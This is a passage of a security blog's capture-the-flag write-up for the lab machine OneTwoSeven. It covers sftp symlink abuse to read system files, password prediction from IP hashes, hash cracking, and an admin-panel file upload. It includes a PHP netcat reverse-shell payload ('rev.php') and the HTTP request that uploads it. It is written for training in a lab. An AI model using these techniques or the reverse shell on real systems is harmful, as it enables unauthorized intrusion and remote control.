@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - OneTwoSeven | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Hack The Box - OneTwoSeven" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="My write-up for OneTwoSeven from Hack The Box." />
+<meta property="og:description" content="My write-up for OneTwoSeven from Hack The Box." />
+<link rel="canonical" href="http://localhost:4000/hack-the-box/onetwoseven/" />
+<meta property="og:url" content="http://localhost:4000/hack-the-box/onetwoseven/" />
+<meta property="og:site_name" content="0xRick" />
+<meta property="og:image" content="http://localhost:4000/hackthebox/onetwoseven/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-08-31T00:00:00+02:00" />
+<script type="application/ld+json">
+{"description":"My write-up for OneTwoSeven from Hack The Box.","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/onetwoseven/","image":"http://localhost:4000/hackthebox/onetwoseven/0.png","headline":"Hack The Box - OneTwoSeven","dateModified":"2019-08-31T00:00:00+02:00","datePublished":"2019-08-31T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/onetwoseven/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
+
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - OneTwoSeven</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+      <a class="tag" href="/tag/php/">php</a>
+      
+      <a class="tag" href="/tag/code-analysis/">code-analysis</a>
+      
+      <a class="tag" href="/tag/networking/">networking</a>
+      
+      <a class="tag" href="/tag/ssh/">ssh</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 31 Aug 2019</div>
+  
+  <div class="post-description">My write-up for OneTwoSeven from Hack The Box.</div>
+  
+  <hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today OneTwoSeven retired and here’s my write-up about it. It was a very special box and I enjoyed every part of it, especially the <code class="highlighter-rouge">apt</code> man in the middle attack part. Definitely one of my favorite boxes. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.133</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">onetwoseven.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/onetwoseven/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sC onetwoseven.htb</code>
+<img src="/images/hackthebox/onetwoseven/1.png" alt="" />
+<br /> Only <code class="highlighter-rouge">http</code> on port 80 and <code class="highlighter-rouge">ssh</code>.
+<br /></p>
+<hr />
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p><br /> By going to <code class="highlighter-rouge">http://onetwoseven.htb</code> we see this nice website :
+<img src="/images/hackthebox/onetwoseven/2.png" alt="" />
+<br /> There’s a sign-up button, and some other info :
+<img src="/images/hackthebox/onetwoseven/3.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/4.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/5.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/6.png" alt="" />
+<br /> So now we know that <code class="highlighter-rouge">sftp</code> is running, and we also know that if we tried to bruteforce anything we’ll get banned. 
+<br /> If we look at the navigation bar we can see 3 pages :
+<img src="/images/hackthebox/onetwoseven/7.png" alt="" />
+<br /> Home is where we are, statistics just shows stuff like up-time, banned ip addresses etc.., there’s a page titled Admin and it’s disabled, let’s look at the <code class="highlighter-rouge">html</code> source :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        &lt;!-- Only enable link if access from trusted networks admin/20190212 --&gt;
+        &lt;!-- Added localhost admin/20190214 --&gt;
+		  &lt;li class="nav-item"&gt;&lt;a id="adminlink" class="nav-link disabled" href="http://onetwoseven.htb:60080/"&gt;Admin&lt;/a&gt;&lt;/li&gt;
+
+</code></pre></div></div>
+<p><br /> Admin’s page is on port 60080 and it’s only accessible from <code class="highlighter-rouge">localhost</code>, so we can skip that for now.
+<br /> I clicked on the sign-up button and got this page :
+<img src="/images/hackthebox/onetwoseven/8.png" alt="" />
+<br /> We have credentials for <code class="highlighter-rouge">sftp</code> : <code class="highlighter-rouge">ots-5MWI1ZmI : f991b5fb</code>
+<br /> and we also have a personal home page (http://onetwoseven.htb/~ots-5MWI1ZmI/) which looks like this :
+<img src="/images/hackthebox/onetwoseven/9.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>Nothing here.<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;style&gt;body</span> <span class="p">{</span> <span class="nl">margin</span><span class="p">:</span><span class="m">0</span><span class="p">;</span> <span class="nl">padding</span><span class="p">:</span><span class="m">0</span><span class="p">;</span> <span class="nl">background</span><span class="p">:</span><span class="sx">url("/dist/img/abstract-architecture-attractive-988873.jpg")</span> <span class="nb">no-repeat</span> <span class="nb">center</span> <span class="nb">center</span> <span class="nb">fixed</span><span class="p">;</span> <span class="nl">-webkit-background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="nl">-moz-background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="nl">-o-background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="nl">background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="p">}</span><span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<p><br /></p>
+<hr />
+
+<h2 id="sftp-user-flag">SFTP, User Flag</h2>
+<p><br /> With the <code class="highlighter-rouge">sftp</code> credentials we have we can access the root directory of our home page :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# sftp ots-5MWI1ZmI@onetwoseven.htb
+ots-5MWI1ZmI@onetwoseven.htb's password:
+Connected to ots-5MWI1ZmI@onetwoseven.htb.
+sftp&gt; ls
+public_html
+sftp&gt; ls -la
+drwxr-xr-x    3 0        0            4096 Aug 29 19:57 .
+drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
+drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 public_html
+sftp&gt; pwd
+Remote working directory: /
+sftp&gt; cd public_html
+sftp&gt; ls -la
+drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 .
+drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
+-rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html
+sftp&gt; 
+</code></pre></div></div>
+<p><br /> You may wonder why we didn’t see an open port for <code class="highlighter-rouge">sftp</code>, that’s because <code class="highlighter-rouge">sftp</code> runs on top of <code class="highlighter-rouge">ssh</code> by default, check <a href="https://www.jscape.com/blog/what-port-does-sftp-use">this</a>.
+<br /> I created a <code class="highlighter-rouge">php</code> test file and uploaded it :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+echo 'test';
+?&gt;
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; put test.php
+Uploading test.php to /public_html/test.php
+test.php                                                                                                                                                                         100%   22     0.1KB/s   00:00    
+sftp&gt;  
+</code></pre></div></div>
+<p><br /> Unfortunately it will respond with <code class="highlighter-rouge">403</code> to any uploaded <code class="highlighter-rouge">php</code> file :
+<img src="/images/hackthebox/onetwoseven/10.png" alt="" />
+<br /> I checked the commands list of <code class="highlighter-rouge">sftp</code> and saw that I can create symlinks with <code class="highlighter-rouge">symlink</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; help
+Available commands:
+bye                                Quit sftp
+cd path                            Change remote directory to 'path'
+chgrp grp path                     Change group of file 'path' to 'grp'
+chmod mode path                    Change permissions of file 'path' to 'mode'
+chown own path                     Change owner of file 'path' to 'own'
+df [-hi] [path]                    Display statistics for current directory or
+                                   filesystem containing 'path'
+exit                               Quit sftp
+get [-afPpRr] remote [local]       Download file
+reget [-fPpRr] remote [local]      Resume download file
+reput [-fPpRr] [local] remote      Resume upload file
+help                               Display this help text
+lcd path                           Change local directory to 'path'
+lls [ls-options [path]]            Display local directory listing
+lmkdir path                        Create local directory
+ln [-s] oldpath newpath            Link remote file (-s for symlink)
+lpwd                               Print local working directory
+ls [-1afhlnrSt] [path]             Display remote directory listing
+lumask umask                       Set local umask to 'umask'
+mkdir path                         Create remote directory
+progress                           Toggle display of progress meter
+put [-afPpRr] local [remote]       Upload file
+pwd                                Display remote working directory
+quit                               Quit sftp
+rename oldpath newpath             Rename remote file
+rm path                            Delete remote file
+rmdir path                         Remove remote directory
+symlink oldpath newpath            Symlink remote file
+version                            Show SFTP version
+!command                           Execute 'command' in local shell
+!                                  Escape to local shell
+?                                  Synonym for help
+sftp&gt; 
+</code></pre></div></div>
+<p><br /> So I tried to create a symlink to <code class="highlighter-rouge">/etc/passwd</code> and it worked :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; symlink /etc/passwd passwd
+sftp&gt; ls -la
+drwxr-xr-x    2 1010     1010         4096 Aug 29 20:14 .
+drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
+-rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html
+lrwxrwxrwx    1 1010     1010           11 Aug 29 20:14 passwd
+sftp&gt; 
+</code></pre></div></div>
+<p><img src="/images/hackthebox/onetwoseven/11.png" alt="" />
+<br /> As you can see there’s a user with <code class="highlighter-rouge">localhost</code>’s ip, that can be helpful but we need to know his password, we already got the username : <code class="highlighter-rouge">ots-yODc2NGQ</code>.
+<br /> I wanted to know how usernames were generated so I made some assumptions and tested them.
+<br /> Usernames were following the same pattern which was <code class="highlighter-rouge">ots-</code> then a base-64 encoded string , I tried to decode the string from my username (<code class="highlighter-rouge">5MWI1ZmI</code>) but I got nothing readable, so I tried to encode my password (<code class="highlighter-rouge">f991b5fb</code>) :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# echo f991b5fb | base64
+Zjk5MWI1ZmIK
+</code></pre></div></div>
+<p><br /> So the string in usernames is part of the base-64 encoded password, but how these password are generated in the first place ? my password looked like <code class="highlighter-rouge">hex</code> but after decoding it I got nothing readable so I guessed it might be a part of an <code class="highlighter-rouge">md5</code> hash, but what hash ? I tried the <code class="highlighter-rouge">md5</code> hash of my ip :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# python
+Python 2.7.16 (default, Apr  6 2019, 01:42:57)
+[GCC 8.3.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; from hashlib import md5
+&gt;&gt;&gt; print md5("10.10.xx.xx").hexdigest()
+f991b5fbxxxxxxxxxxxxxxxxxxxxxxxx
+&gt;&gt;&gt;
+
+</code></pre></div></div>
+<p><br /> So passwords are just the first 8 chars of the ip’s md5 hash, now we can generate the password for <code class="highlighter-rouge">ots-yODc2NGQ</code> based on the same idea :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; print md5("127.0.0.1").hexdigest()
+f528764d624db129b32c21fbca0cb8d6
+&gt;&gt;&gt; 
+</code></pre></div></div>
+<p><br /> <code class="highlighter-rouge">ots-yODc2NGQ : f528764d</code>  , let’s try it :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# sftp ots-yODc2NGQ@onetwoseven.htb
+ots-yODc2NGQ@onetwoseven.htb's password:
+Connected to ots-yODc2NGQ@onetwoseven.htb.
+sftp&gt; ls -la
+drwxr-xr-x    3 0        0            4096 Feb 15  2019 .
+drwxr-xr-x    3 0        0            4096 Feb 15  2019 ..
+drwxr-xr-x    2 999      999          4096 Feb 15  2019 public_html
+-r--r-----    1 0        999            33 Feb 15  2019 user.txt
+sftp&gt; get user.txt
+Fetching /user.txt to user.txt
+/user.txt                                                                                                                                                                        100%   33     0.2KB/s   00:00    
+sftp&gt;
+</code></pre></div></div>
+<p><img src="/images/hackthebox/onetwoseven/12.png" alt="" />
+<br /> We owned user.
+<br /></p>
+<hr />
+
+<h2 id="admin-panel-arbitrary-file-upload-rce">Admin panel, Arbitrary File Upload, RCE</h2>
+<p><br /> I tried <code class="highlighter-rouge">ssh</code> but I got this message :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# ssh ots-yODc2NGQ@onetwoseven.htb
+ots-yODc2NGQ@onetwoseven.htb's password:
+This service allows sftp connections only.
+Connection to onetwoseven.htb closed.
+</code></pre></div></div>
+<p><br /> However we can still use it to forward ports, let’s forward port <code class="highlighter-rouge">60080</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# ssh -nNT -L 60080:127.0.0.1:60080 ots-yODc2NGQ@onetwoseven.htb
+ots-yODc2NGQ@onetwoseven.htb's password:
+</code></pre></div></div>
+<p><img src="/images/hackthebox/onetwoseven/13.png" alt="" />
+<br /> We need credentials to login, I used the <code class="highlighter-rouge">symlink</code> command and created a symlink to <code class="highlighter-rouge">/var/www</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; symlink /var/www www
+sftp&gt; 
+</code></pre></div></div>
+<p><img src="/images/hackthebox/onetwoseven/14.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/15.png" alt="" />
+<br /> I downloaded <code class="highlighter-rouge">login.php.swp</code> : 
+<img src="/images/hackthebox/onetwoseven/16.png" alt="" />
+<br /> Because it’s a <code class="highlighter-rouge">vim</code> swap file it had a lot of unreadable characters so I used strings :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# strings login.php.swp &gt; login.php
+root@kali:~/Desktop/HTB/boxes/onetwoseven#
+</code></pre></div></div>
+<p><br /> <code class="highlighter-rouge">login.php</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b0VIM 8.0
+u\k*
+root
+onetwoseven
+/var/www/html-admin/login.php
+utf-8
+3210
+#"! 
+	    <span class="nt">&lt;table&gt;</span>
+            <span class="nt">&lt;h4</span> <span class="na">class =</span><span class="err"> </span><span class="s">"form-signin-heading"</span><span class="nt">&gt;&lt;font</span> <span class="na">size=</span><span class="s">"-1"</span> <span class="na">color=</span><span class="s">"red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php echo $msg; ?&gt;</span><span class="nt">&lt;/font&gt;&lt;/h4&gt;</span>
+         <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/login.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+      
+      <span class="nt">&lt;div</span> <span class="na">class =</span><span class="err"> </span><span class="s">"container"</span><span class="nt">&gt;</span>
+      
+      <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- /container --&gt;</span>
+         ?&gt;
+            }
+              }
+    				      
+		   
+	      if ($_POST['username'] == 'ots-admin' <span class="err">&amp;&amp;</span> hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {
+            if (isset($_POST['login']) <span class="err">&amp;&amp;</span> !empty($_POST['username']) <span class="err">&amp;&amp;</span> !empty($_POST['password'])) {
+            
+            $msg = '';
+          <span class="cp">&lt;?php
+        &lt;h2 class="featurette-heading"&gt;Login to the kingdom.&lt;span class="text-muted"&gt; Up up and away!&lt;/span&gt;&lt;/h2&gt;
+      &lt;div class="col-md-12"&gt;
+    &lt;div class="row featurette"&gt;
+    &lt;!-- START THE FEATURETTES --&gt;
+  &lt;div class="container marketing"&gt;
+  &lt;!-- Wrap the rest of the page in another container to center all the content. --&gt;
+  ================================================== --&gt;
+  &lt;!-- Marketing messaging and featurettes
+  &lt;/div&gt;
+    &lt;/a&gt;
+      &lt;span class="sr-only"&gt;Next&lt;/span&gt;
+      &lt;span class="carousel-control-next-icon" aria-hidden="true"&gt;&lt;/span&gt;
+    &lt;a class="carousel-control-next" href="#myCarousel" role="button" data-slide="next"&gt;
+    &lt;/a&gt;
+      &lt;span class="sr-only"&gt;Previous&lt;/span&gt;
+      &lt;span class="carousel-control-prev-icon" aria-hidden="true"&gt;&lt;/span&gt;
+    &lt;a class="carousel-control-prev" href="#myCarousel" role="button" data-slide="prev"&gt;
+    &lt;/div&gt;
+      &lt;/div&gt;
+        &lt;/div&gt;
+          &lt;/div&gt;
+            &lt;p&gt;Administration backend. For administrators only.&lt;/p&gt;
+            &lt;h1&gt;OneTwoSeven Administration&lt;/h1&gt;
+          &lt;div class="carousel-caption text-left"&gt;
+        &lt;div class="container"&gt;
+        &lt;img src="dist/img/ai-codes-coding-97077.jpg"&gt;
+      &lt;div class="carousel-item active"&gt;
+    &lt;div class="carousel-inner"&gt;
+    &lt;/ol&gt;
+      &lt;li data-target="#myCarousel" data-slide-to="0" class="active"&gt;&lt;/li&gt;
+    &lt;ol class="carousel-indicators"&gt;
+  &lt;div id="myCarousel" class="carousel slide" data-ride="carousel"&gt;
+&lt;main role="main"&gt;
+&lt;/header&gt;
+  &lt;/nav&gt;
+    &lt;/div&gt;
+    &lt;div class="collapse navbar-collapse" id="navbarCollapse"&gt;
+    &lt;/button&gt;
+      &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;
+    &lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation"&gt;
+    &lt;a class="navbar-brand" href="/login.php"&gt;OneTwoSeven - Administration Backend&lt;/a&gt;
+  &lt;nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark"&gt;
+    &lt;header&gt;
+  &lt;body&gt;
+  &lt;/head&gt;
+    &lt;link href="carousel.css" rel="stylesheet"&gt;
+    &lt;!-- Custom styles for this template --&gt;
+    &lt;/style&gt;
+      @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } }
+      .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+    &lt;style&gt;
+    &lt;link href="/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous"&gt;
+    &lt;!-- Bootstrap core CSS --&gt;
+    &lt;title&gt;OneTwoSeven&lt;/title&gt;
+    &lt;meta name="generator" content="Jekyll v3.8.5"&gt;
+    &lt;meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors"&gt;
+    &lt;meta name="description" content=""&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;
+    &lt;meta charset="utf-8"&gt;
+  &lt;head&gt;
+&lt;html lang="en"&gt;
+&lt;!doctype html&gt;
+&lt;?php session_start(); if (isset ($_SESSION['username'])) { header("Location: /menu.php"); } ?&gt;</span>
+<span class="cp">&lt;?php if ( $_SERVER['SERVER_PORT'] != 60080 ) { die(); } ?&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+      <span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">jQuery</span> <span class="o">||</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">'&lt;script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"&gt;&lt;</span><span class="err">\</span><span class="s1">/script&gt;'</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">"dist/js/bootstrap.bundle.min.js"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;&lt;/body&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-3.3.1.slim.min.js"</span> <span class="na">integrity=</span><span class="s">"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;/main&gt;</span>
+  <span class="nt">&lt;/footer&gt;</span>
+    <span class="nt">&lt;p&gt;</span><span class="ni">&amp;copy;</span> 2019 OneTwoSeven, Dec. <span class="ni">&amp;middot;</span> <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Privacy<span class="nt">&lt;/a&gt;</span> <span class="ni">&amp;middot;</span> <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Terms<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
+    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"float-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Back to top<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
+  <span class="nt">&lt;footer</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+  <span class="c">&lt;!-- FOOTER --&gt;</span>
+  <span class="nt">&lt;/div&gt;</span><span class="c">&lt;!-- /.container --&gt;</span>
+    <span class="c">&lt;!-- /END THE FEATURETTES --&gt;</span>
+    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"featurette-divider"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+	     <span class="nt">&lt;/div&gt;</span>
+         <span class="nt">&lt;/form&gt;</span>
+            <span class="nt">&lt;/table&gt;</span>
+              <span class="nt">&lt;tr&gt;&lt;td</span> <span class="na">colspan=</span><span class="s">"2"</span><span class="nt">&gt;&lt;center&gt;&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"login"</span><span class="nt">&gt;</span>Login<span class="nt">&lt;/button&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;</span>
+              <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Password:<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">required</span><span class="nt">&gt;&lt;/td&gt;&lt;/tr&gt;</span>
+              <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Username:<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">required</span> <span class="na">autofocus</span><span class="nt">&gt;&lt;/td&gt;&lt;/tr&gt;</span>
+	    <span class="nt">&lt;table&gt;</span>
+            <span class="nt">&lt;h4</span> <span class="na">class =</span><span class="err"> </span><span class="s">"form-signin-heading"</span><span class="nt">&gt;&lt;font</span> <span class="na">size=</span><span class="s">"-1"</span> <span class="na">color=</span><span class="s">"red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php echo $msg; ?&gt;</span><span class="nt">&lt;/font&gt;&lt;/h4&gt;</span>
+         <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/login.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+      
+      <span class="nt">&lt;div</span> <span class="na">class =</span><span class="err"> </span><span class="s">"container"</span><span class="nt">&gt;</span>
+      
+      <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- /container --&gt;</span>
+         ?&gt;
+            }
+              }
+                  $msg = 'Wrong username or password.';
+              } else {
+		  header("Location: /menu.php");
+                  $_SESSION['username'] = 'ots-admin';
+</code></pre></div></div>
+<p><br /> The credentials are hardcoded, however the password is hashed :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ($_POST['username'] == 'ots-admin' &amp;&amp; hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') { 
+</code></pre></div></div>
+<p><br /> <a href="[https://crackstation.net](https://crackstation.net/)">Crackstation</a> was able to crack it :
+<img src="/images/hackthebox/onetwoseven/17.png" alt="" />
+<br /> <code class="highlighter-rouge">ots-admin : Homesweethome1</code> :
+<img src="/images/hackthebox/onetwoseven/18.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/19.png" alt="" />
+<br /> There’s a plugin upload form and some installed plugins above it, additionally there’s a small button to download the module’s <code class="highlighter-rouge">php</code> source from the directory <code class="highlighter-rouge">/addons</code>:
+<img src="/images/hackthebox/onetwoseven/20.png" alt="" />
+<br /> If we can upload plugins then we got <code class="highlighter-rouge">RCE</code>, the form submit button is disabled but we can easily change that :
+<img src="/images/hackthebox/onetwoseven/21.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/22.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/23.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/24.png" alt="" />
+<br /> <code class="highlighter-rouge">rev.php</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');
+?&gt;
+</code></pre></div></div>
+<p><img src="/images/hackthebox/onetwoseven/25.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/26.png" alt="" />
+<br /> It sent the request to <code class="highlighter-rouge">addon-upload.php</code> and the response was 404.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /addon-upload.php HTTP/1.1
+Host: 127.0.0.1:60080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php
+Content-Type: multipart/form-data; boundary=---------------------------171386507112993851681929761040
+Content-Length: 326
+Cookie: PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+-----------------------------171386507112993851681929761040
+
+Content-Disposition: form-data; name="addon"; filename="rev.php"
+Content-Type: application/x-php
+
+&lt;?php
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');
+?&gt;
+
+-----------------------------171386507112993851681929761040--
+</code></pre></div></div>
+<p><br />  If we check the <code class="highlighter-rouge">Addon manager</code> plugin we can see some interesting things :
+<img src="/images/hackthebox/onetwoseven/27.png" alt="" />
